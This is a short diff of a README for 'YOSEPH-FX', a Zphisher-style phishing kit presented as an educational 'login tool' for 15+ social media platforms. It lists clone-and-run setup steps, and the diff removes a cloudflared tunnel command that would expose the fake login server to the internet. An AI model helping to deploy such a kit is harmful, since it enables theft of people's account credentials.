@@ -1,4 +1,4 @@
-# ⚡ YOSEPH-FX v3.0 (Official)
+# ⚡ YOSEPH-FX  (Official)
 **YOSEPH-FX** is a professional Multi-Platform Login Tool designed for educational purposes and security testing. It features a Zphisher-style CLI menu and supports over 15+ popular social media platforms.
 
 ---
@@ -24,4 +24,3 @@ pip install flask requests --break-system-packages
 git clone [https://github.com/yosephalganeh-cloud/YOSEPH-FX.git](https://github.com/yosephalganeh-cloud/YOSEPH-FX.git)
 cd YOSEPH-FX
 python app.py
-cloudflared tunnel --url [http://127.0.0.1:5000](http://127.0.0.1:5000)
